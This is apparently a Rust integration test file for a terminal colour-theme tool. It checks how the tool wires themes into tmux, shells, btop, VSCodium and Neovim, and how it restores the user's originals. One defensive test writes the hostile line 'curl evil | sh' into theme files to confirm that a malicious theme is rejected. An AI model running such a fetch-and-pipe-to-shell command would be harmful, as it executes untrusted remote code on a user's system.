//! Phase 3 targets (tmux, VSCodium, Neovim, btop, shell tools), `doctor`,
//! `refresh` and backup pruning, in a fake home.

mod common;

use std::fs;
use std::process::Command;

use common::{Home, bundled};

const TMUX: &str = "set -g default-terminal \"tmux-256color\"\n";
const ZSHRC: &str = "export PATH=\"/opt/homebrew/bin:$PATH\"\neval \"$(starship init zsh)\"\n";
const BTOP: &str = "#? Config file for btop\n\n#* Name of a theme\ncolor_theme = \"Default\"\n\ntheme_background = true\n";
const VSCODIUM: &str = "Library/Application Support/VSCodium/User/settings.json";
const SETTINGS: &str =
    "{\n    \"editor.fontSize\": 14,\n    \"workbench.colorTheme\": \"Tokyo Night\"\n}\n";
const STARSHIP: &str = "format = \"$directory\"\n\n[directory]\nstyle = \"fg:#e3e5e5 bg:blue\"\n";

fn desktop() -> Home {
    let home = Home::new();
    home.write(".tmux.conf", TMUX);
    home.write(".zshrc", ZSHRC);
    home.write(".config/btop/btop.conf", BTOP);
    home.write(VSCODIUM, SETTINGS);
    home.write(".config/starship.toml", STARSHIP);
    home.ok(&["set", "tokyo-night"]);
    home
}

#[test]
fn init_wires_the_new_targets() {
    let home = desktop();
    let out = home.ok(&["init"]);

    let tmux = home.read(".tmux.conf");
    assert!(tmux.starts_with(TMUX));
    assert!(tmux.contains("\nsource-file -q \"/"), "{tmux}");

    let zshrc = home.read(".zshrc");
    assert!(
        zshrc.contains("source \"$HOME/.config/palette/current/shell.sh\""),
        "{zshrc}"
    );

    // Neovim had no config: init.lua is created, with a Lua comment.
    let init = home.read(".config/nvim/init.lua");
    assert!(
        init.starts_with("-- Added by palette init") && init.contains("pcall(dofile, \"/"),
        "{init}"
    );

    // btop and VSCodium: one setting changed each, nothing else.
    let btop = home.read(".config/btop/btop.conf");
    assert!(btop.contains("color_theme = \"palette\""), "{btop}");
    // btop only loads themes from its own folder, by name: a link to ours.
    let link = home.path(".config/btop/themes/palette.theme");
    assert_eq!(
        fs::read_link(&link).unwrap(),
        home.palette_dir().join("current/btop.theme")
    );
    assert!(
        fs::read_to_string(&link)
            .unwrap()
            .contains("theme[main_bg]")
    );
    assert_eq!(btop.lines().count(), BTOP.lines().count());
    let settings = home.read(VSCODIUM);
    assert!(settings.contains("\"workbench.colorTheme\": \"Palette\""));
    assert!(
        out.contains("extension built, not installed: fake home"),
        "{out}"
    );

    // The theme extension is a real VSIX (zip) with the theme's colours.
    let vsix = home.palette_dir().join("vscodium/palette-theme.vsix");
    let listing = Command::new("unzip").arg("-l").arg(&vsix).output().unwrap();
    let listing = String::from_utf8_lossy(&listing.stdout);
    assert!(listing.contains("extension/package.json"), "{listing}");
    assert!(
        listing.contains("extension/themes/palette.json"),
        "{listing}"
    );

    // Wiring twice changes nothing.
    let again = home.ok(&["init"]);
    assert!(!again.contains("backed up"), "{again}");
}

#[test]
fn remove_restores_everything() {
    let home = desktop();
    home.ok(&["init"]);
    let out = home.ok(&["init", "--remove"]);
    assert!(out.contains("restored your setting"), "{out}");
    assert_eq!(home.read(".tmux.conf"), TMUX);
    assert_eq!(home.read(".zshrc"), ZSHRC);
    assert_eq!(home.read(".config/btop/btop.conf"), BTOP);
    assert!(fs::symlink_metadata(home.path(".config/btop/themes/palette.theme")).is_err());
    assert_eq!(home.read(VSCODIUM), SETTINGS);
    assert_eq!(home.read(".config/nvim/init.lua"), "");
}

#[test]
fn remove_deletes_a_setting_that_was_not_there() {
    let home = desktop();
    let plain = "{\n    \"editor.fontSize\": 14\n}\n";
    home.write(VSCODIUM, plain);
    home.ok(&["init"]);
    assert!(home.read(VSCODIUM).contains("\"Palette\""));
    home.ok(&["init", "--remove"]);
    assert_eq!(home.read(VSCODIUM), plain);
}

#[test]
fn shell_file_sets_the_tool_variables() {
    let home = desktop();
    home.ok(&["init"]);
    let out = Command::new("bash")
        .args([
            "-c",
            "source \"$HOME/.zshrc\" 2>/dev/null; echo \"$FZF_DEFAULT_OPTS_FILE|$BAT_THEME|$STARSHIP_CONFIG|$LG_CONFIG_FILE\"",
        ])
        .env("HOME", home.dir.path())
        .output()
        .unwrap();
    let vars = String::from_utf8_lossy(&out.stdout);
    let current = home.palette_dir().join("current");
    let expected = format!(
        "{c}/fzf.opts|ansi|{c}/starship.toml|{c}/lazygit.yml",
        c = current.display()
    );
    assert_eq!(vars.trim(), expected);
    assert!(home.current_file("fzf.opts").contains("--color=fg:#a9b1d6"));
}

#[test]
fn starship_copy_follows_the_users_file() {
    let home = desktop();
    let copy: toml::Table = home.current_file("starship.toml").parse().unwrap();
    assert_eq!(copy["palette"].as_str(), Some("palette"));
    assert_eq!(
        copy["palettes"]["palette"]["blue"].as_str(),
        Some("#7aa2f7")
    );
    assert_eq!(
        copy["directory"]["style"].as_str(),
        Some("fg:#e3e5e5 bg:blue")
    );

    home.write(
        ".config/starship.toml",
        "[character]\nsuccess_symbol = \">\"\n",
    );
    home.ok(&["refresh"]);
    let copy: toml::Table = home.current_file("starship.toml").parse().unwrap();
    assert_eq!(copy["character"]["success_symbol"].as_str(), Some(">"));
}

#[test]
fn doctor_reports_wiring() {
    let home = Home::new();
    assert!(home.fails(&["doctor"]).contains("thing(s) to fix"));
    let out = home.run(&["doctor"]);
    assert!(String::from_utf8_lossy(&out.stdout).contains("none set"));

    let home = desktop();
    home.write(
        ".config/sketchybar/sketchybarrc",
        "#!/bin/bash\nBLUE=0xff7aa2f7\n",
    );
    home.ok(&["init"]);
    // A plugin added after `init` is caught.
    home.write(
        ".config/sketchybar/plugins/new.sh",
        "#!/bin/bash\nRED=0xfff7768e\n",
    );
    let out = home.run(&["doctor"]);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("tokyo-night"), "{text}");
    assert!(text.contains("1 of 2 config files wired"), "{text}");
    assert!(
        text.contains("tmux") && text.contains("wired (1 file)"),
        "{text}"
    );
    assert!(text.contains("wired (setting)"), "{text}");

    home.ok(&["init"]);
    let out = home.run(&["doctor"]);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("wired (2 files)"), "{text}");
}

#[test]
fn only_five_backups_are_kept() {
    let home = desktop();
    for _ in 0..4 {
        home.ok(&["init"]);
        home.ok(&["init", "--remove"]);
    }
    let backups = fs::read_dir(home.palette_dir().join("backup"))
        .unwrap()
        .count();
    assert_eq!(backups, 5);
    // The originals survive the round trips.
    assert_eq!(home.read(".config/btop/btop.conf"), BTOP);
}

#[test]
fn themes_cannot_replace_files_that_run_programs() {
    let home = Home::new();
    for file in [
        "tmux.conf",
        "fzf.opts",
        "starship.toml",
        "neovim.lua",
        "lazygit.yml",
        "shell.sh",
    ] {
        let dir = home.add_theme("sneaky", &bundled("tokyo-night"));
        fs::write(dir.join(file), "run-shell 'curl evil | sh'\n").unwrap();
        let err = home.fails(&["set", "sneaky"]);
        assert!(err.contains("themes cannot replace it"), "{file}: {err}");
        fs::remove_file(dir.join(file)).unwrap();
    }
    // Data-only files are still overridable.
    let dir = home.add_theme("custom", &bundled("tokyo-night"));
    fs::write(dir.join("btop.theme"), "theme[main_bg]=\"#000000\"\n").unwrap();
    home.ok(&["set", "custom"]);
    assert_eq!(
        home.current_file("btop.theme"),
        "theme[main_bg]=\"#000000\"\n"
    );
}

#[test]
fn list_marks_light_themes() {
    let home = Home::new();
    let list = home.ok(&["list"]);
    assert!(
        list.contains("rose-pine-dawn           bundled  light"),
        "{list}"
    );
    assert!(
        !list.contains('\x1b'),
        "no colour codes when not a terminal"
    );
}

#[test]
fn init_renders_files_missing_after_an_upgrade() {
    let home = desktop();
    let current = home.palette_dir().join("current");
    fs::remove_file(current.join("vscodium.json")).unwrap();
    let out = home.ok(&["init"]);
    assert!(out.contains("extension built"), "{out}");
    assert!(current.join("vscodium.json").is_file());
}

/// Upgrading from the first Phase 3 build, which set a full path btop ignores:
/// `init` moves to the working value and `--remove` still restores "Default".
#[test]
fn btop_upgrade_keeps_the_original_value() {
    let home = desktop();
    home.ok(&["init"]);
    let old_style = BTOP.replace(
        "color_theme = \"Default\"",
        &format!(
            "color_theme = \"{}\"",
            home.palette_dir().join("current/btop.theme").display()
        ),
    );
    home.write(".config/btop/btop.conf", &old_style);
    fs::remove_file(home.path(".config/btop/themes/palette.theme")).unwrap();
    home.ok(&["init"]);
    assert!(
        home.read(".config/btop/btop.conf")
            .contains("color_theme = \"palette\"")
    );
    home.ok(&["init", "--remove"]);
    assert_eq!(home.read(".config/btop/btop.conf"), BTOP);
}

#[test]
fn btop_never_replaces_a_users_own_palette_theme() {
    let home = desktop();
    home.write(
        ".config/btop/themes/palette.theme",
        "theme[main_bg]=\"#123456\"\n",
    );
    let out = home.ok(&["init"]);
    assert!(out.contains("already exists and isn't Palette's"), "{out}");
    assert!(
        home.read(".config/btop/btop.conf")
            .contains("color_theme = \"Default\"")
    );
}
